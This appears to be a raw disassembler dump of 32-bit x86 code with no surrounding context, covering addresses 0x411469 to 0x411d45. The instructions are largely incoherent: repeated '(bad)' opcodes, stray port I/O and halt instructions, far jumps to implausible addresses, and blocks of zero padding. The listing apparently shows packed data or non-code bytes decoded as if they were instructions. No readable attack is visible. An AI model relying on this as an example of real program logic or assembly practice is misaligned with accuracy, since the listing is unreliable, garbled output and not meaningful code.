  411469:	sub    al,BYTE PTR [ecx-0x17]
  41146c:	loopne 0x411480
  41146e:	add    dh,dh
  411470:	add    al,0x3f
  411472:	add    cl,ch
  411474:	pusha  
  411475:	add    BYTE PTR [ebp+ebx*2-0x4601ace7],0xb3
  41147d:	imul   ebp,DWORD PTR [edi],0xa530ba1
  411483:	sub    DWORD PTR [edx-0x77],ebp
  411486:	mov    ds:0x830560e8,eax
  41148b:	ins    BYTE PTR es:[edi],dx
  41148c:	mov    bl,0x52
  41148e:	(bad)  
  41148f:	es pop edi
  411491:	add    BYTE PTR [esi+esi*2+0x64000560],al
  411498:	mov    ah,0xa8
  41149a:	std    
  41149b:	push   cs
  41149c:	mov    al,al
  41149e:	inc    BYTE PTR [eax]
  4114a0:	addr16 mov ch,0xfc
  4114a3:	call   FWORD PTR ds:0xd37ecdd
  4114a9:	scas   al,BYTE PTR es:[edi]
  4114aa:	sub    esi,esi
  4114ac:	add    DWORD PTR [eax-0x5202015e],0xffffffe9
  4114b3:	aaa    
  4114b4:	push   esp
  4114b5:	(bad)  
  4114b6:	mov    ch,0x84
  4114b8:	pop    esp
  4114b9:	mov    eax,ds:0x951dfffc
  4114be:	push   bx
  4114c0:	xor    DWORD PTR [esi+edi*8-0x74],eax
  4114c4:	inc    edi
  4114c5:	retf   0xfffc
	...
  4114d4:	add    BYTE PTR [eax],al
  4114d6:	add    BYTE PTR ds:0xc141e695,cl
  4114dc:	add    al,0x0
  4114de:	xor    esi,0x8
  4114e1:	lea    eax,[ebp-0x250f8]
  4114e7:	jp     0x411497
  4114e9:	mov    bl,0xa4
  4114eb:	fsubr  QWORD PTR [ebp-0x73a1703]
  4114f1:	(bad)  
  4114f2:	call   DWORD PTR [ebx]
  4114f4:	iret   
  4114f5:	mov    ds:0x44ad0dfe,al
  4114fa:	cmp    esp,0x53
  4114fd:	jo     0x4114c3
  4114ff:	std    
  411500:	jle    0x4114f4
  411502:	(bad)  
  411503:	sbb    eax,0x58b4e6ad
  411508:	scas   al,BYTE PTR es:[edi]
  411509:	std    
  41150a:	mov    DWORD PTR [edi],0x1dfffc6c
  411510:	add    al,0x0
  411512:	add    BYTE PTR [edx+0x62],cl
  411515:	add    BYTE PTR [ebp-0x39339],cl
  41151b:	jge    0x4114b1
  41151d:	std    
  41151e:	mov    ch,0x66
  411520:	scas   al,BYTE PTR es:[edi]
  411521:	std    
  411522:	call   DWORD PTR [edx+0x4e]
  411525:	das    
  411526:	jmp    DWORD PTR [ebx-0x9]
  411529:	or     eax,eax
  41152b:	pop    esp
  41152c:	jmp    0xbc81:0x5e24ff5a
  411533:	fisttp DWORD PTR [edi+0x56]
  411536:	(bad)  
  411537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411538:	je     0x41153c
	...
  41154a:	pop    esp
  41154b:	jmp    0x5e4614ba
  411550:	xchg   DWORD PTR [eax+edi*8-0x6c01a9d1],eax
  411557:	(bad)  
  411558:	inc    DWORD PTR [eax]
  41155a:	arpl   WORD PTR [esi+0x6a],bx
  41155d:	jecxz  0x4115b9
  41155f:	pop    esi
  411560:	add    cl,BYTE PTR [ebx]
  411562:	mov    ds:0x63ce7e5e,eax
  411567:	pop    esi
  411568:	add    bh,BYTE PTR ds:0x25d67
  41156e:	push   esp
  41156f:	fistp  QWORD PTR [edi]
  411571:	(bad)  
  411572:	mov    esp,0x694f6a5d
  411577:	pop    esi
  411578:	add    dl,BYTE PTR [eax+0x3b]
  41157b:	repnz retf 0x6340
  41157f:	fld    DWORD PTR [eax+0x56ce9dc1]
  411585:	dec    edi
  411586:	mov    eax,ecx
  411588:	or     DWORD PTR [eax],eax
  41158a:	arpl   bx,bx
  41158c:	aas    
  41158d:	or     edi,ecx
  41158f:	pop    ebp
  411590:	xchg   DWORD PTR [eax+edi*2+0x13fe56af],eax
  411597:	(bad)  
  411598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411599:	or     BYTE PTR [ebx+0x5e],ah
  41159c:	xchg   DWORD PTR [eax+ebp*2-0x4c01a939],eax
  4115a3:	mov    ah,0x13
  4115a5:	inc    ebx
  4115a6:	push   esp
  4115a7:	sbb    BYTE PTR [ebx],cl
  4115a9:	rcl    dh,0xfc
  4115ac:	jmp    0x411573
	...
  4115ba:	add    BYTE PTR [eax],al
  4115bc:	add    BYTE PTR [ebx+0x5],bh
  4115bf:	test   al,0x3
  4115c1:	out    dx,al
  4115c2:	mov    BYTE PTR [ecx],ah
  4115c4:	push   esi
  4115c5:	xor    eax,0x1b6bb84f
  4115ca:	or     ecx,DWORD PTR [esi]
  4115cc:	push   edi
  4115cd:	xlat   BYTE PTR ds:[ebx]
  4115ce:	js     0x4115fa
  4115d0:	push   esi
  4115d1:	sbb    eax,0xfcb39a4f
  4115d6:	cmc    
  4115d7:	mov    ah,0x56
  4115d9:	or     eax,0xdf88d95b
  4115de:	inc    ebx
  4115df:	out    0x56,al
  4115e1:	std    
  4115e2:	mov    ch,0x6b
  4115e4:	cmp    cl,0x4f
  4115e7:	aad    0x56
  4115e9:	pushf  
  4115ea:	pop    ebp
  4115eb:	test   DWORD PTR [edx],ebx
  4115ed:	in     al,0x4e
  4115ef:	outs   dx,DWORD PTR ds:[esi]
  4115f0:	sbb    BYTE PTR [eax],0x50
  4115f3:	mov    ebp,0x7498d556
  4115f8:	push   ebp
  4115f9:	int    0x4e
  4115fb:	lods   eax,DWORD PTR ds:[esi]
  4115fc:	nop
  4115fd:	ror    BYTE PTR [edi-0x5b],1
  411600:	push   esi
  411601:	(bad)  
  411602:	(bad)  
  411604:	push   esi
  411605:	mov    ch,0xfa
  411607:	test   al,0xcf
  411609:	jno    0x4115e8
  41160b:	xor    bl,cl
  41160d:	and    eax,DWORD PTR ds:0x5645e91
  411613:	jmp    0x21ee12cb
  411618:	lds    ecx,FWORD PTR [edi+ecx*2+0x4e869f33]
  41161f:	imul   eax,DWORD PTR gs:[eax],0x0
	...
  41162f:	add    BYTE PTR [ebp-0x3e],dh
  411632:	pop    ebp
  411633:	push   esi
  411634:	or     al,BYTE PTR [ebx+eax*8]
  411637:	add    edi,ecx
  411639:	add    al,0x4e
  41163b:	nop
  41163c:	test   al,0x4f
  41163e:	inc    ebp
  41163f:	push   esi
  411640:	les    esi,FWORD PTR [ebp-0x23ab3af1]
  411646:	(bad)  
  411647:	call   0xe94ad904
  41164c:	pusha  
  41164d:	dec    esi
  41164e:	mov    ah,0x65
  411650:	xchg   esi,eax
  411651:	dec    edi
  411652:	(bad)  
  411653:	adc    ebp,edi
  411655:	push   ss
  411656:	call   DWORD PTR [esi]
  411658:	xchg   ebp,eax
  411659:	cdq    
  41165a:	mov    ds:0xe74f8d0f,eax
  41165f:	dec    ebp
  411660:	ins    DWORD PTR es:[edi],dx
  411661:	dec    esi
  411662:	(bad)  
  411663:	(bad)  
  411664:	in     al,0x51
  411666:	std    
  411667:	div    BYTE PTR [esi-0x5241fa9a]
  41166d:	dec    edi
  41166e:	sti    
  41166f:	sbb    ah,BYTE PTR [edi-0x71210173]
  411675:	dec    edi
  411676:	icebp  
  411677:	xchg   DWORD PTR [edi+0x6],ecx
  41167a:	pcmpgtb mm2,QWORD PTR [edi+ecx*2-0x2]
  41167f:	(bad)  
  411680:	adc    eax,0x4aac8af
  411685:	jnp    0x411672
  411687:	push   0x23
  411689:	pop    esi
  41168a:	addr16 in al,dx
  41168c:	inc    ecx
  41168d:	push   cs
  41168e:	add    BYTE PTR [ecx-0x613cfb6f],ah
	...
  4116a0:	add    BYTE PTR [eax],al
  4116a2:	add    dl,ch
  4116a4:	xor    esp,DWORD PTR [edi-0x14]
  4116a7:	popa   
  4116a8:	add    eax,0x168d8100
  4116ad:	inc    DWORD PTR [esi+0x248833ea]
  4116b3:	cmp    edi,DWORD PTR [ebx-0x2f]
  4116b6:	add    DWORD PTR [esp+eax*1-0x1f071700],ecx
  4116bd:	ss pushw ss
  4116c0:	jnp    0x411693
  4116c2:	jo     0x411678
  4116c4:	pop    ebp
  4116c5:	addr16 in al,dx
  4116c7:	popa   
  4116c8:	add    eax,0x16ad4100
  4116cd:	inc    DWORD PTR [eax]
  4116cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d0:	jle    0x4116a2
  4116d2:	mov    edi,DWORD PTR [eax-0x80]
  4116d5:	inc    ebx
  4116d6:	clc    
  4116d7:	rcl    DWORD PTR [edi],0x8a
  4116da:	shl    BYTE PTR [edx],cl
  4116dc:	dec    ebp
  4116dd:	(bad)  
  4116de:	dec    DWORD PTR [edx-0x4e]
  4116e1:	jae    0x4116df
  4116e3:	ror    BYTE PTR [eax],1
  4116e5:	call   0x4a5a05
  4116ea:	mov    ebp,DWORD PTR [eax+0x7e]
  4116ed:	sar    bh,1
  4116ef:	lahf   
  4116f0:	mov    eax,0x90b0466
  4116f5:	add    al,ch
  4116f7:	nop
  4116f8:	add    BYTE PTR [eax],al
  4116fa:	add    BYTE PTR [ecx],al
  4116fc:	leave  
  4116fd:	jb     0x41170e
  4116ff:	jno    0x411717
  411701:	addr16 pop ebp
  411703:	xor    DWORD PTR [eax-0x2],ecx
  411706:	inc    BYTE PTR [eax]
	...
  411714:	add    BYTE PTR [eax],al
  411716:	(bad)  
  411717:	mov    cl,0xe6
  411719:	xor    DWORD PTR [edx],eax
  41171b:	or     DWORD PTR [eax],eax
  41171d:	mov    edi,eax
  41171f:	pop    esi
  411720:	(bad)  
  411721:	imul   ecx,edx,0xba6a005e
  411727:	pop    esi
  411728:	add    DWORD PTR [eax-0x46],ebp
  41172b:	or     BYTE PTR [eax],al
  41172d:	rol    BYTE PTR ds:0xf6e8ee3c,0x49
  411734:	(bad)  
  411735:	inc    DWORD PTR [ebx-0x75]
  411738:	repnz inc eax
  41173a:	ror    eax,0x73
  41173d:	inc    esp
  41173e:	in     eax,0x3b
  411740:	cli    
  411741:	dec    DWORD PTR [edi+0x7dffe6b8]
  411747:	or     BYTE PTR [eax],al
  411749:	push   0x56
  41174b:	pop    edi
  41174c:	(bad)  
  41174d:	(bad)  
  41174e:	lahf   
  41174f:	mov    eax,0x87373e6
  411754:	add    BYTE PTR [ebx],cl
  411756:	arpl   WORD PTR [esi],bx
  411758:	iret   
  411759:	or     esp,DWORD PTR [ebx]
  41175b:	inc    esi
  41175c:	mov    ch,0x4a
  41175e:	mov    ds:0x40e7b25e,al
  411763:	arpl   WORD PTR [edx],ax
  411765:	add    BYTE PTR [ecx-0x450017a2],bh
  41176b:	pusha  
  41176c:	call   0xeaa0e270
  411771:	push   DWORD PTR [esi+ebx*2]
  411774:	inc    edx
  411775:	(bad)  
  411776:	mov    dh,0xee
  411778:	push   0xffffff95
	...
  411786:	add    BYTE PTR [eax],al
  411788:	add    BYTE PTR [esi+ebx*2+0x2],bl
  41178c:	mov    DWORD PTR [esi-0x778c3eb6],esp
  411792:	jbe    0x411771
  411794:	dec    edx
  411795:	mov    ds:0x5c9d6a5e,al
  41179a:	pop    esi
  41179b:	add    dl,BYTE PTR [eax-0x75]
  41179e:	mov    ecx,0x2b6340be
  4117a3:	fdiv   st,st(3)
  4117a5:	sti    
  4117a6:	mov    ds:0xde4ff14,eax
  4117ab:	push   ebx
  4117ac:	je     0x411785
  4117ae:	xor    eax,0x5e6306ce
  4117b3:	stos   BYTE PTR es:[edi],al
  4117b4:	or     ah,BYTE PTR [ebx+0x20eb0608]
  4117ba:	fdivr  st,st(3)
  4117bd:	dec    ebx
  4117be:	mov    cl,0xbe
  4117c0:	inc    eax
  4117c1:	arpl   WORD PTR [ebx-0x28],bp
  4117c4:	idiv   DWORD PTR [ebx-0x5b000457]
  4117ca:	fiadd  WORD PTR [edi+0xb]
  4117cd:	or     ebx,DWORD PTR [ebx+0x766340be]
  4117d3:	xchg   esp,eax
  4117d4:	push   es
  4117d5:	arpl   WORD PTR [esi-0x3],bx
  4117d8:	mov    edi,0xb8da400f
  4117dd:	sub    BYTE PTR ds:0x5d1303a8,al
  4117e3:	nop
  4117e4:	or     esp,DWORD PTR [ebx+0x5]
  4117e7:	loop   0x41182c
  4117e9:	lock test edx,0x3
	...
  4117fc:	leave  
  4117fd:	add    eax,0x4b4cd946
  411802:	mov    bl,0x53
  411804:	les    esi,FWORD PTR [ebp-0x22bb3b01]
  41180a:	call   0x9b8c4461
  41180f:	dec    edi
  411810:	cmp    al,0x15
  411812:	xlat   BYTE PTR ds:[ebx]
  411813:	push   edx
  411814:	sub    eax,0x3c539b4b
  411819:	sbb    eax,0x4b1d52d7
  41181e:	jnp    0x41186b
  411820:	cld    
  411821:	and    al,0xb7
  411823:	push   edx
  411824:	or     eax,0xb1bb293d
  411829:	fisttp QWORD PTR [ebx+0x66]
  41182c:	cmp    al,0x5
  41182e:	loope  0x411805
  411830:	arpl   WORD PTR [esi-0x23],ax
  411833:	mov    fs,WORD PTR [ebx+0x5]
  411836:	jmp    0x2199bc3e
  41183b:	(bad)
  41183e:	out    0xba,eax
  411840:	mov    esp,0xcd532494
  411845:	es xchg ecx,eax
  411847:	dec    edi
  411848:	xchg   ecx,eax
  411849:	inc    ebp
  41184a:	outs   dx,DWORD PTR ds:[esi]
  41184b:	push   edx
  41184c:	mov    ebp,0x655a54a
  411851:	push   cs
  411852:	out    0xd8,al
  411854:	les    edi,FWORD PTR [esi-0x57]
  411857:	scas   al,BYTE PTR es:[edi]
  411858:	add    eax,0x887f3346
  41185d:	xchg   BYTE PTR [ebx+edx*2+0x0],ch
	...
  41186c:	add    BYTE PTR [eax],al
  41186e:	add    BYTE PTR [ecx],dh
  411870:	fst    QWORD PTR [ebx+0x54c65]
  411876:	jno    0x411826
  411878:	add    eax,0x9e56ec3
  41187d:	fist   WORD PTR [edi]
  41187f:	sahf   
  411880:	dec    edx
  411881:	(bad)  
  411882:	aad    0x76
  411884:	xchg   DWORD PTR [esi+ecx*2],edi
  411887:	inc    edx
  411888:	(bad)  
  411889:	(bad)  
  41188a:	call   0x4c415c3
  41188f:	mov    ah,0x18
  411891:	inc    ecx
  411892:	jmp    0x245e8f7
  411897:	lahf   
  411898:	scas   eax,DWORD PTR es:[edi]
  411899:	enter  0x5d2a,0x2e
  41189d:	out    0xcd,eax
  41189f:	imul   eax,DWORD PTR ds:0x4deb6c00,0xba288351
  4118a9:	(bad)  
  4118aa:	hlt    
  4118ab:	push   ecx
  4118ac:	sbb    BYTE PTR [ecx-0x17],al
  4118af:	adc    eax,0x90650e8a
  4118b4:	dec    edx
  4118b5:	(bad)  
  4118b6:	jmp    0xea38da54
  4118bb:	pusha  
  4118bc:	add    eax,0x521c7400
  4118c1:	dec    edi
  4118c2:	push   ebx
  4118c3:	addr16 (bad) 
  4118c6:	inc    edx
  4118c7:	pusha  
  4118c8:	dec    edx
  4118c9:	je     0x411898
  4118cb:	xor    dh,cl
  4118cd:	out    0x17,al
  4118cf:	mov    al,ds:0xa90949
	...
  4118e0:	add    BYTE PTR [eax],al
  4118e2:	mov    ah,0xdb
  4118e4:	out    0x39,eax
  4118e6:	pop    edx
  4118e7:	add    eax,0xcc2f6a00
  4118ec:	je     0x4118f7
  4118ee:	fmulp  st(0),st
  4118f0:	imul   ecx
  4118f2:	xchg   esp,eax
  4118f3:	stos   DWORD PTR es:[edi],eax
  4118f4:	(bad)  
  4118f5:	sbb    al,0x17
  4118f7:	bound  edi,QWORD PTR [edi-0x2c]
  4118fa:	xor    ecx,DWORD PTR [ebx-0x78]
  4118fd:	add    BYTE PTR [edi-0x53],al
  411900:	mov    eax,DWORD PTR [ebp-0x1e]
  411903:	nop
  411904:	std    
  411905:	jne    0x411919
  411907:	mov    ah,0x73
  411909:	hlt    
  41190a:	pusha  
  41190b:	push   es
  41190c:	push   DWORD PTR [ebp-0x2]
  41190f:	mov    bl,0x13
  411911:	out    0x5c,eax
  411913:	inc    esi
  411914:	dec    BYTE PTR [edx]
  411916:	cmp    ch,BYTE PTR ds:0xb1078b2c
  41191c:	mov    DWORD PTR [eax],edx
  41191e:	iret   
  41191f:	inc    eax
  411920:	out    dx,al
  411921:	push   eax
  411922:	call   0x5d2c2cdc
  411927:	inc    esp
  411928:	dec    BYTE PTR [edx]
  41192a:	mov    ch,BYTE PTR ds:0x8a6a6818
  411930:	aas    
  411931:	add    BYTE PTR [ebp+0x30],cl
  411934:	out    dx,al
  411935:	call   0x41149a
  41193a:	add    ebp,eax
  41193c:	jae    0x41193f
  41193e:	leave  
  41193f:	mov    ch,0x73
  411941:	lock jb 0x411934
  411944:	add    eax,0x0
	...
  411955:	cli    
  411956:	mov    ch,0x73
  411958:	hlt    
  411959:	bound  ecx,QWORD PTR [esi+0x33]
  41195c:	(bad)  
  41195d:	std    
  41195e:	mov    ch,0x73
  411960:	cld    
  411961:	adc    bh,dh
  411963:	add    eax,0xc1c9fa00
  411968:	pop    ebx
  411969:	add    eax,edx
  41196b:	push   ebx
  41196c:	mov    ebp,DWORD PTR [esi+0xcc0c283]
  411972:	mov    dh,0xfd
  411974:	push   ebx
  411975:	and    dh,BYTE PTR [edi-0x1f]
  411978:	inc    eax
  411979:	retf   0x70bc
  41197c:	add    DWORD PTR [ecx],ecx
  41197e:	mov    dh,0x81
  411980:	cmp    eax,0x40ebaa
  411985:	arpl   WORD PTR [esi-0x2a],bx
  411988:	sbb    ah,al
  41198a:	cmp    esi,esi
  41198c:	sub    BYTE PTR [edx],ah
  41198e:	pop    esi
  41198f:	add    dh,BYTE PTR [ecx+esi*2-0x25]
  411993:	or     eax,0x41d35df
  411998:	add    bh,dh
  41199a:	cmp    DWORD PTR fs:[eax+eax*4],0xfffffff0
  41199f:	ret    0x6cff
  4119a2:	xor    DWORD PTR ds:0x3993a32b,eax
  4119a8:	ret    0x1388
  4119ab:	push   eax
  4119ac:	adc    al,0x73
  4119ae:	cmc    
  4119af:	ret    0xdbff
  4119b2:	mov    al,ds:0x21dec656
  4119b7:	push   ecx
  4119b8:	inc    BYTE PTR [eax]
	...
  4119c6:	add    BYTE PTR [eax],al
  4119c8:	cmp    al,0x6
  4119ca:	add    eax,DWORD PTR [eax]
  4119cc:	arpl   WORD PTR [edx+eax*1+0x6a],si
  4119d0:	popa   
  4119d1:	neg    BYTE PTR [ecx-0x7ca19cfb]
  4119d7:	neg    DWORD PTR [edi+eiz*1]
  4119da:	xchg   BYTE PTR ds:0x89025e62,bl
  4119e0:	out    0x15,al
  4119e2:	push   ecx
  4119e3:	inc    BYTE PTR [ecx+eiz*8]
  4119e6:	test   ebx,ecx
  4119e8:	std    
  4119e9:	push   esi
  4119ea:	dec    esi
  4119eb:	dec    edi
  4119ec:	hlt    
  4119ed:	push   0x26ecfd3b
  4119f2:	pop    ebx
  4119f3:	lea    ebx,[ebp+0x5e]
  4119f6:	add    cl,BYTE PTR [ebx]
  4119f8:	mov    ds:0x63f28626,eax
  4119fd:	pop    esi
  4119fe:	add    ch,BYTE PTR [eax-0x50]
  411a01:	adc    al,ch
  411a03:	call   edi
  411a05:	fcom   DWORD PTR [ebx-0x3]
  411a08:	mov    esp,0x52e7b396
  411a0d:	add    eax,0xfc6303ee
  411a12:	test   al,0xff
  411a14:	loopne 0x411a59
  411a16:	call   0x63817d1e
  411a1b:	dec    eax
  411a1c:	xchg   esi,eax
  411a1d:	inc    edi
  411a1e:	test   DWORD PTR [ebx+eiz*2],eax
  411a21:	add    eax,0x40df80e9
  411a26:	jbe    0x411a77
  411a28:	jge    0x4119de
  411a2a:	ins    DWORD PTR es:[edi],dx
  411a2b:	cdq    
	...
  411a38:	add    BYTE PTR [eax],al
  411a3a:	add    BYTE PTR [eax+0x6d4f6546],dl
  411a40:	icebp  
  411a41:	hlt    
  411a42:	sbb    al,0x22
  411a44:	add    eax,0x48207962
  411a49:	dec    ebp
  411a4a:	dec    edi
  411a4b:	imul   eax,DWORD PTR [ebp-0xb],0xe905f487
  411a52:	add    ecx,DWORD PTR [eax-0x1800c350]
  411a58:	jbe    0x411a42
  411a5a:	add    esp,DWORD PTR [ebx+0x46]
  411a5d:	pop    ebx
  411a5e:	cmp    BYTE PTR [esi],ch
  411a60:	inc    edi
  411a61:	sbb    eax,0xe8df24da
  411a66:	add    esp,DWORD PTR [ebx+0x3]
  411a69:	add    DWORD PTR [ecx],esp
  411a6b:	pop    ebp
  411a6c:	add    eax,0xd1ccfae9
  411a71:	jg     0x411aef
  411a73:	lahf   
  411a74:	dec    ebp
  411a75:	arpl   cx,cx
  411a77:	clc    
  411a78:	mov    ch,0x80
  411a7a:	pop    edx
  411a7b:	arpl   WORD PTR [ebx],ax
  411a7d:	jmp    0xdd8e91d0
  411a82:	clc    
  411a83:	add    eax,0x68042818
  411a88:	inc    ebp
  411a89:	push   esp
  411a8a:	lods   al,BYTE PTR ds:[esi]
  411a8b:	aad    0xd0
  411a8d:	les    ecx,FWORD PTR [esi+0x77]
  411a90:	bound  ecx,QWORD PTR [esi]
  411a92:	(bad)
  411a95:	jmp    FWORD PTR [eax-0x59bcf26c]
  411a9b:	jmp    0x411a23
  411a9d:	std    
  411a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  411aab:	add    BYTE PTR [eax],al
  411aad:	add    BYTE PTR ds:0x60e9fe46,bl
  411ab3:	js     0x411a39
  411ab5:	test   eax,0x39fe472e
  411aba:	mov    bh,0x7
  411abc:	add    dh,dh
  411abe:	pusha  
  411abf:	pop    ebp
  411ac0:	pop    esi
  411ac1:	out    0x60,eax
  411ac3:	add    eax,0xf19ba90b
  411ac8:	sub    BYTE PTR [eax+eiz*1],0x48
  411acc:	(bad)  
  411acd:	pushaw 
  411acf:	ror    DWORD PTR [ebx],1
  411ad1:	pop    esi
  411ad2:	retf   
  411ad3:	xchg   ch,bh
  411ad5:	push   esi
  411ad6:	lods   eax,DWORD PTR ds:[esi]
  411ad7:	ja     0x411add
  411ad9:	mov    ah,0x77
  411adb:	(bad)  
  411adc:	call   DWORD PTR [ecx+0x71]
  411adf:	pop    edx
  411ae0:	sbb    DWORD PTR [esi],edi
  411ae2:	sub    ecx,DWORD PTR [edx-0x19]
  411ae5:	jge    0x411b4b
  411ae7:	add    eax,0x4e1b2e00
  411aec:	out    0x55,eax
  411aee:	fs add eax,0x47281200
  411af4:	je     0x411b07
  411af6:	mov    eax,0x60e903a4
  411afb:	js     0x411a81
  411afd:	xor    eax,0x99fe479e
  411b02:	xchg   ebp,eax
  411b03:	xchg   ecx,eax
  411b04:	(bad)  
  411b05:	imul   DWORD PTR [esi+0x6b45e747]
  411b0b:	add    eax,0x4664d000
  411b10:	(bad)  
  411b11:	fiadd  WORD PTR [eax]
	...
  411b1f:	add    BYTE PTR [eax],al
  411b21:	xchg   esi,eax
  411b22:	xchg   ecx,eax
  411b23:	(bad)  
  411b24:	xlat   BYTE PTR ds:[ebx]
  411b25:	cs inc edi
  411b27:	out    0x69,eax
  411b29:	imul   eax,DWORD PTR ds:0xc4510000,0x59
  411b30:	leave  
  411b31:	stc    
  411b32:	lea    ecx,[ecx-0x2142b614]
  411b38:	push   ebx
  411b39:	and    dh,bh
  411b3b:	in     al,0x40
  411b3d:	mov    edx,0xf90170b9
  411b42:	mov    bh,0x81
  411b44:	cmp    eax,0x40e725
  411b49:	mov    ch,BYTE PTR ds:0x6ca78307
  411b4f:	sub    al,0x41
  411b51:	jp     0x411b54
  411b53:	jne    0x411b5a
  411b55:	mov    eax,ds:0xc9c959c1
  411b5a:	mov    edi,0x17afc43
  411b5f:	add    BYTE PTR [eax],al
  411b61:	cmp    eax,0x4a00f63e
  411b66:	or     DWORD PTR [eax],eax
  411b68:	(bad)  
  411b69:	jmp    esp
  411b6b:	(bad)  
  411b6c:	(bad)  
  411b6d:	cmp    cl,BYTE PTR [ecx]
  411b6f:	mov    DWORD PTR [ebp-0x72],0x4a000009
  411b76:	retf   0xf043
  411b79:	dec    edx
  411b7a:	or     DWORD PTR [eax],eax
  411b7c:	add    BYTE PTR [edi-0x48af11b4],dh
  411b82:	dec    esp
  411b83:	repnz push eax
	...
  411b91:	add    BYTE PTR [eax],al
  411b93:	add    BYTE PTR [edi-0x1faf15b4],al
  411b99:	ror    DWORD PTR [ebx+0x68796645],1
  411b9f:	add    dh,al
  411ba1:	add    eax,0x3bf5006a
  411ba6:	lods   eax,DWORD PTR ds:[esi]
  411ba7:	cs retf 
  411ba9:	or     BYTE PTR [ecx+0x7b861245],cl
  411baf:	call   0x814878ae
  411bb4:	arpl   cx,bx
  411bb6:	pop    ebx
  411bb7:	jmp    0x75434a1f
  411bbc:	push   edi
  411bbd:	dec    ebx
  411bbe:	aad    0xfb
  411bc0:	aam    0xe9
  411bc2:	dec    ebx
  411bc3:	cmp    BYTE PTR [esi],0x76
  411bc6:	add    dh,BYTE PTR [ecx+ebx*1-0x59]
  411bca:	lods   eax,DWORD PTR ds:[esi]
  411bcb:	idiv   DWORD PTR [eax+0x3b724b2b]
  411bd1:	xchg   esi,eax
  411bd2:	aad    0x41
  411bd4:	pushf  
  411bd5:	fwait
  411bd6:	jns    0x411c1c
  411bd8:	adc    DWORD PTR [ebx-0x100717f1],0x4c
  411bdf:	(bad)  
  411be0:	pop    eax
  411be1:	outs   dx,BYTE PTR ds:[esi]
  411be2:	(bad)  
  411be3:	and    ch,dl
  411be5:	icebp  
  411be6:	imul   esp,DWORD PTR [bx-0x7a],0xab6c315c
  411bee:	dec    ebx
  411bef:	je     0x411b74
  411bf1:	mov    bl,0xc2
  411bf3:	pop    es
  411bf4:	pop    esp
  411bf5:	popa   
  411bf6:	data16 mov es,WORD PTR [eax]
	...
  411c05:	add    BYTE PTR [eax],al
  411c07:	mov    ds:0x84344b2a,eax
  411c0c:	ja     0x411bcf
  411c0e:	call   ebp
  411c10:	sub    eax,0x6da8269f
  411c15:	add    al,BYTE PTR [ebx+0x4c4b7a20]
  411c1b:	aas    
  411c1c:	scas   eax,DWORD PTR es:[edi]
  411c1d:	int    0xeb
  411c1f:	arpl   WORD PTR [ecx+0x1a96fe87],bx
  411c25:	dec    esp
  411c26:	adc    al,0xc8
  411c28:	add    ecx,0xffffffff
  411c2b:	and    eax,0x4ff4e71
  411c30:	add    al,BYTE PTR cs:[ecx-0xa6f982]
  411c37:	hlt    
  411c38:	sub    eax,0x4fa04d5
  411c3d:	inc    ebp
  411c3e:	dec    ebx
  411c3f:	in     eax,0x43
  411c41:	imul   ecx,ecx,0xfd5d04d8
  411c47:	aad    0xb9
  411c49:	int3   
  411c4a:	dec    ebx
  411c4b:	ja     0x411cbd
  411c4d:	push   ss
  411c4e:	(bad)
  411c51:	out    0x3,eax
  411c53:	arpl   WORD PTR ds:0xd9a13d12,ax
  411c59:	popa   
  411c5a:	pop    eax
  411c5b:	loope  0x411ca5
  411c5d:	mov    esp,0x23ad0db7
  411c62:	bound  ebx,QWORD PTR [ebp+eax*1-0x6f]
  411c66:	(bad)  
  411c67:	arpl   WORD PTR [eax-0x73],cx
  411c6a:	xchg   DWORD PTR [eax],eax
	...
  411c78:	add    BYTE PTR [eax],al
  411c7a:	dec    edi
  411c7b:	sub    dh,dl
  411c7d:	les    eax,FWORD PTR [ebx+eax*2+0x1e1fcf4]
  411c84:	xchg   BYTE PTR [edx],bl
  411c86:	and    al,BYTE PTR ds:0xf066d0e9
  411c8c:	sub    BYTE PTR [ebx+0x7f294e09],ch
  411c92:	jg     0x411c7e
  411c94:	mov    eax,ds:0x772e54c4
  411c99:	add    eax,0x20510563
  411c9e:	inc    edi
  411c9f:	inc    ebx
  411ca0:	cmp    eax,0xa1ee7f87
  411ca5:	les    esi,FWORD PTR [ebx+eax*2]
  411ca8:	mov    ah,0xf2
  411caa:	sub    eax,0x6f4aecb7
  411caf:	out    dx,al
  411cb0:	mov    cl,0xc4
  411cb2:	sbb    al,0x2b
  411cb4:	inc    esi
  411cb5:	pop    es
  411cb6:	arpl   WORD PTR ds:0x89743e2,ax
  411cbc:	adc    dh,bl
  411cbe:	arpl   WORD PTR ds:0x41a742e9,ax
  411cc4:	(bad)  
  411cc5:	call   0x5c41222a
  411cca:	and    bh,BYTE PTR [edi]
  411ccc:	dec    edi
  411ccd:	push   ebx
  411cce:	pop    edi
  411ccf:	scas   eax,DWORD PTR es:[edi]
  411cd0:	add    esi,ebx
  411cd2:	mov    ch,0x6
  411cd4:	push   0xffffffe9
  411cd6:	sub    DWORD PTR [edi+0x33d3ce03],esi
  411cdc:	sub    eax,0x28
	...
  411ced:	pop    edi
  411cee:	push   cs
  411cef:	shl    BYTE PTR ds:0xe9882c62,0x60
  411cf6:	add    eax,0x2d633aff
  411cfb:	pop    ecx
  411cfc:	sub    BYTE PTR [eax],bl
  411cfe:	inc    ebx
  411cff:	mov    BYTE PTR [edi+ebp*1],ah
  411d02:	inc    ebx
  411d03:	jb     0x411cf2
  411d05:	cmp    BYTE PTR [eax],dh
  411d07:	add    ecx,ebp
  411d09:	pusha  
  411d0a:	aad    0xfe
  411d0c:	cld    
  411d0d:	sbb    dl,dl
  411d0f:	(bad)  
  411d10:	cli    
  411d11:	jl     0x411cbd
  411d13:	jmp    edi
  411d15:	pusha  
  411d16:	add    eax,0x426ce968
  411d1b:	(bad)  
  411d1c:	push   ecx
  411d1d:	add    eax,DWORD PTR [edi]
  411d1f:	add    cl,ch
  411d21:	pop    ebp
  411d22:	xor    BYTE PTR [ebx+0x2],0xa0
  411d26:	leave  
  411d27:	sti    
  411d28:	jmp    0x7441228d
  411d2d:	and    edi,DWORD PTR [esi]
  411d2f:	dec    edi
  411d30:	shl    DWORD PTR [eax-0x51],cl
  411d33:	add    DWORD PTR [esi],esi
  411d35:	adc    edi,DWORD PTR [edx]
  411d37:	imul   ebp,ecx,0x2603b799
  411d3d:	xor    esi,DWORD PTR [ebx]
  411d3f:	sub    eax,0xc00e60a8
  411d44:	popf   
  411d45:	push   ss
